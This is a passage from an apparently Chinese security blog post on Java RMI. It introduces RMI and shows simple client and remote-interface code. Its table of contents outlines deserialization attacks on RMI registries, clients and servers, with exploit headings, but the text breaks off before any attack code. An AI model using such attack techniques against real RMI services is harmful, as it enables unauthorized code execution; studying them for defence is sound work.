<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><script src="/xvsf/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=xvsf/livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>RMI | xvsf</title>
<meta name="keywords" content="RMI通信">
<meta name="description" content="RMI基础及几种攻击方式">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/xvsf/posts/rmi/">
<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.da226b913d2f27f5edb9c2d1d023f1755892e2b19b710900079a2575a932e8d6.css" integrity="sha256-2iJrkT0vJ/XtucLR0CPxdViS4rGbcQkAB5oldaky6NY=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/xvsf/img/2.jpg">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/xvsf/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/xvsf/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/xvsf/posts/rmi/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-lite-webfont@1.1.0/style.css" />




<div class="progress-bar"></div>


<script>
document.addEventListener('DOMContentLoaded', () => {
    const progressBar = document.querySelector('.progress-bar');

    
    const calculateScrollProgress = () => {
        const windowHeight = window.innerHeight;
        const documentHeight = document.documentElement.scrollHeight - windowHeight;
        const scrollTop = window.scrollY;
        const progress = (scrollTop / documentHeight) * 100;
        progressBar.style.width = `${progress}%`;
    };

    
    window.addEventListener('scroll', calculateScrollProgress);

    
    calculateScrollProgress();
});
</script>



</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/xvsf/" title="首页">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/posts/" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/categories/" title="归类">
                    <span>归类</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      RMI
    </h1>
    <div class="post-description">
      RMI基础及几种攻击方式
    </div>
    <div class="post-meta"><span title='2025-09-20 15:00:00 +0800 CST'>September 20, 2025</span>&nbsp;·&nbsp;17 min&nbsp;·&nbsp;<a href="http://localhost:1313/xvsf/categories/java%E5%9F%BA%E7%A1%80/">Java基础</a>

</div>
  </header> 

  
  
  <div class="post-content" style="position: relative;">
    
    <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#1rmi%e6%98%af%e4%bb%80%e4%b9%88" aria-label="1、RMI是什么">1、RMI是什么</a></li>
                    <li>
                        <a href="#2rmi-%e5%9f%ba%e6%9c%ac%e5%ae%9e%e7%8e%b0" aria-label="2、RMI 基本实现">2、RMI 基本实现</a><ul>
                            
                    <li>
                        <a href="#%e5%ae%a2%e6%88%b7%e7%ab%af" aria-label="客户端">客户端</a></li>
                    <li>
                        <a href="#%e6%9c%8d%e5%8a%a1%e7%ab%af" aria-label="服务端">服务端</a></li></ul>
                    </li>
                    <li>
                        <a href="#3%e6%b5%81%e7%a8%8b%e5%8e%9f%e7%90%86" aria-label="3、流程原理">3、流程原理</a><ul>
                            
                    <li>
                        <a href="#31-%e6%9c%8d%e5%8a%a1%e7%ab%af-%e5%88%9b%e5%bb%ba%e8%bf%9c%e7%a8%8b%e6%9c%8d%e5%8a%a1" aria-label="3.1 服务端-创建远程服务">3.1 服务端-创建远程服务</a></li>
                    <li>
                        <a href="#32-%e6%b3%a8%e5%86%8c%e4%b8%ad%e5%bf%83-%e5%88%9b%e5%bb%ba%e6%b3%a8%e5%86%8c%e4%b8%ad%e5%bf%83%e7%bb%91%e5%ae%9a" aria-label="3.2 注册中心-创建注册中心&#43;绑定">3.2 注册中心-创建注册中心+绑定</a></li>
                    <li>
                        <a href="#33-%e5%ae%a2%e6%88%b7%e7%ab%af-%e8%af%b7%e6%b1%82%e6%b3%a8%e5%86%8c%e4%b8%ad%e5%bf%83" aria-label="3.3 客户端-请求注册中心">3.3 客户端-请求注册中心</a><ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%98%e5%9c%a8%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%97%b6%e9%81%87%e5%88%b0%e6%8a%a5%e9%94%99%e5%8f%af%e8%83%bd%e6%98%af%e6%9c%8d%e5%8a%a1%e7%ab%af%e6%b2%a1%e6%9c%89%e5%bc%80%e5%90%af" aria-label="问题：在动态调试时遇到报错，可能是服务端没有开启！">问题：在动态调试时遇到报错，可能是服务端没有开启！</a></li></ul>
                    </li>
                    <li>
                        <a href="#34-%e5%ae%a2%e6%88%b7%e7%ab%af-%e8%af%b7%e6%b1%82%e6%9c%8d%e5%8a%a1%e7%ab%af" aria-label="3.4 客户端-请求服务端">3.4 客户端-请求服务端</a><ul>
                            
                    <li>
                        <a href="#%e6%80%bb%e7%bb%93-%e5%ae%a2%e6%88%b7%e7%ab%af%e4%ba%a7%e7%94%9f%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e7%82%b9" aria-label="总结-客户端产生的反序列化漏洞点">总结-客户端产生的反序列化漏洞点</a></li></ul>
                    </li>
                    <li>
                        <a href="#35-%e6%b3%a8%e5%86%8c%e4%b8%ad%e5%bf%83-%e5%ae%a2%e6%88%b7%e7%ab%af%e8%af%b7%e6%b1%82%e6%97%b6" aria-label="3.5 注册中心-客户端请求时">3.5 注册中心-客户端请求时</a><ul>
                            
                    <li>
                        <a href="#%e6%80%bb%e7%bb%93-%e6%b3%a8%e5%86%8c%e4%b8%ad%e5%bf%83%e4%ba%a7%e7%94%9f%e7%9a%84%e6%bc%8f%e6%b4%9e%e7%82%b9" aria-label="总结-注册中心产生的漏洞点">总结-注册中心产生的漏洞点</a></li></ul>
                    </li>
                    <li>
                        <a href="#36-%e6%9c%8d%e5%8a%a1%e7%ab%af-%e5%ae%a2%e6%88%b7%e7%ab%af%e8%af%b7%e6%b1%82%e6%97%b6" aria-label="3.6 服务端-客户端请求时">3.6 服务端-客户端请求时</a></li>
                    <li>
                        <a href="#37-dgc-%e5%ae%a2%e6%88%b7%e7%ab%af%e8%af%b7%e6%b1%82%e6%9c%8d%e5%8a%a1%e7%ab%af" aria-label="3.7 DGC-客户端请求服务端">3.7 DGC-客户端请求服务端</a></li></ul>
                    </li>
                    <li>
                        <a href="#4rmi%e7%9a%84%e5%87%a0%e7%a7%8d%e6%94%bb%e5%87%bb%e6%96%b9%e5%bc%8f" aria-label="4、RMI的几种攻击方式">4、RMI的几种攻击方式</a><ul>
                            
                    <li>
                        <a href="#41-%e6%94%bb%e5%87%bb%e6%b3%a8%e5%86%8c%e4%b8%ad%e5%bf%83" aria-label="4.1 攻击注册中心">4.1 攻击注册中心</a><ul>
                            
                    <li>
                        <a href="#411-bindrebind" aria-label="4.1.1 bind&amp;rebind">4.1.1 bind&amp;rebind</a><ul>
                            
                    <li>
                        <a href="#exp" aria-label="EXP：">EXP：</a></li></ul>
                    </li>
                    <li>
                        <a href="#412-lookupunbind" aria-label="4.1.2 lookup&amp;unbind">4.1.2 lookup&amp;unbind</a><ul>
                            
                    <li>
                        <a href="#exp-1" aria-label="EXP：">EXP：</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#42-%e6%94%bb%e5%87%bb%e5%ae%a2%e6%88%b7%e7%ab%af" aria-label="4.2 攻击客户端">4.2 攻击客户端</a><ul>
                            
                    <li>
                        <a href="#421-%e6%b3%a8%e5%86%8c%e4%b8%ad%e5%bf%83%e6%94%bb%e5%87%bb%e5%ae%a2%e6%88%b7%e7%ab%af" aria-label="4.2.1 注册中心攻击客户端">4.2.1 注册中心攻击客户端</a><ul>
                            
                    <li>
                        <a href="#%e5%90%8e%e7%bb%ad%e5%8f%91%e7%8e%b0%e4%bf%a9%e4%b8%aa%e9%97%ae%e9%a2%98" aria-label="后续发现俩个问题，">后续发现俩个问题，</a><ul>
                            
                    <li>
                        <a href="#%e4%b8%80%e6%98%af-java-%e7%89%88%e6%9c%ac" aria-label="一是 Java 版本">一是 Java 版本</a></li>
                    <li>
                        <a href="#%e4%ba%8c%e6%98%af%e8%bf%90%e8%a1%8c%e8%ae%a1%e7%ae%97%e5%99%a8%e6%97%b6%e5%9b%a0%e4%b8%ba%e5%8a%a0%e4%ba%86-%e5%8d%95%e5%bc%95%e5%8f%b7--%e8%80%8c%e6%89%be%e4%b8%8d%e5%88%b0%e7%a8%8b%e5%ba%8f" aria-label="二是运行计算器时因为加了 单引号 &rsquo;&rsquo; 而找不到程序">二是运行计算器时因为加了 单引号 &rsquo;&rsquo; 而找不到程序</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#422-%e6%9c%8d%e5%8a%a1%e7%ab%af%e6%94%bb%e5%87%bb%e5%ae%a2%e6%88%b7%e7%ab%af" aria-label="4.2.2 服务端攻击客户端">4.2.2 服务端攻击客户端</a><ul>
                            
                    <li>
                        <a href="#%e6%9c%8d%e5%8a%a1%e7%ab%af%e8%bf%94%e5%9b%9eobject%e5%af%b9%e8%b1%a1" aria-label="服务端返回Object对象"><!-- raw HTML omitted -->服务端返回Object对象<!-- raw HTML omitted --></a></li>
                    <li>
                        <a href="#%e8%bf%9c%e7%a8%8b%e5%8a%a0%e8%bd%bd%e5%af%b9%e8%b1%a1" aria-label="远程加载对象"><!-- raw HTML omitted -->远程加载对象<!-- raw HTML omitted --></a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#43-%e6%94%bb%e5%87%bb%e6%9c%8d%e5%8a%a1%e7%ab%af" aria-label="4.3 攻击服务端">4.3 攻击服务端</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" aria-label="参考文章：">参考文章：</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>
<h2 id="1rmi是什么">1、RMI是什么<a hidden class="anchor" aria-hidden="true" href="#1rmi是什么">#</a></h2>
<blockquote>
<p>Java RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。这样做的特点如下：</p>
<p>优点：避免重复造轮子；</p>
<p>缺点：调用过程很慢，而且该过程是不可靠的，容易发生不可预料的错误，比如网络错误等；</p>
<p>在RMI中的核心是远程对象（remote object），除了对象本身所在的虚拟机，其他虚拟机也可以调用此对象的方法，而且这些虚拟机可以不在同一个主机上。每个远程对象都要实现一个或者多个远程接口来标识自己，声明了可以被外部系统或者应用调用的方法（当然也有一些方法是不想让人访问的）。</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053743.png" style="max-width: 100%; height: auto;"></p>
<h2 id="2rmi-基本实现">2、RMI 基本实现<a hidden class="anchor" aria-hidden="true" href="#2rmi-基本实现">#</a></h2>
<h3 id="客户端">客户端<a hidden class="anchor" aria-hidden="true" href="#客户端">#</a></h3>
<div class="code-block-container" id="code-1769750397241257200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397241257200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397241257200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397241257200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397241257200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Remote</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">IRemoteObj</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">sayHello</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">keywords</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397245438600" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397245438600">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397245438600" title="Toggle" aria-expanded="false" aria-controls="code-1769750397245438600" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397245438600-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.NotBoundException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIClient</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">,</span><span class="w"> </span><span class="n">NotBoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">IRemoteObj</span><span class="w"> </span><span class="n">remoteObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">IRemoteObj</span><span class="p">)</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;remoteObj&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">remoteObj</span><span class="p">.</span><span class="na">sayHello</span><span class="p">(</span><span class="s">&#34;hello&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="服务端">服务端<a hidden class="anchor" aria-hidden="true" href="#服务端">#</a></h3>
<div class="code-block-container" id="code-1769750397246442900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397246442900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397246442900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397246442900" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397246442900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Remote</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">IRemoteObj</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">sayHello</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">keywords</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397250591400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397250591400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397250591400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397250591400" aria-label="展开或折叠代码块">
